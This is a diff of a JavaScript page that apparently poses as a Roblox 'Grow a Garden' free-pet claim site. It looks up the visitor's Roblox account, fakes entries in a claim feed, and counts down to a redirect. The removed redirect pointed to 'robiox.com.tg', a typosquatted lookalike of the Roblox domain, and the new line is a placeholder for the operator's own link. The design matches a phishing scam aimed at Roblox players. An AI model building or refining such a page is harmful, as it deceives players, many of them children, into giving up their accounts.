@@ -80,7 +80,7 @@ function update() {
   }
 }
 
-// ----------------- Roblox Lookup (via Vercel API) -----------------
+// ----------------- Roblox Lookup (Vercel API + Avatar Fix) -----------------
 async function lookupRobloxUser(usernameToLookup) {
   const info = document.getElementById('accountInfo');
   info.innerHTML = `<div class="account-searching">Searching for <b>@${usernameToLookup}</b>...</div>`;
@@ -103,8 +103,14 @@ async function lookupRobloxUser(usernameToLookup) {
     const description = userData.description || "No description";
     const userId = userData.id;
 
-    const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;
+    // ✅ Fetch avatar from new thumbnails API
+    const avatarRes = await fetch(
+      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`
+    );
+    const avatarData = await avatarRes.json();
+    const avatarUrl = avatarData.data && avatarData.data[0] ? avatarData.data[0].imageUrl : "";
 
+    // Show account card
     info.innerHTML = `
       <div class="account-card">
         <img src="${avatarUrl}" class="ac-avatar">
@@ -203,7 +209,7 @@ window.startProcessing = function() {
       } else {
         setTimeout(() => {
           let countdown = 5;
-          const redirectUrl = "https://www.robiox.com.tg/games/126884695634066/Grow-a-Garden?privateServerLinkCode=983286587985765853686787059868"; // your link
+          const redirectUrl = "https://www.roblox.com/games/123456789/YourPrivateServer"; // your link
           pushClaimToFeed(username, selected);
           showModal(`
             <h3>Ready to Claim</h3>
@@ -272,4 +278,4 @@ function pushClaimToFeed(user, selection) {
 // ----------------- Init -----------------
 renderPets();
 update();
-    
+                                                        
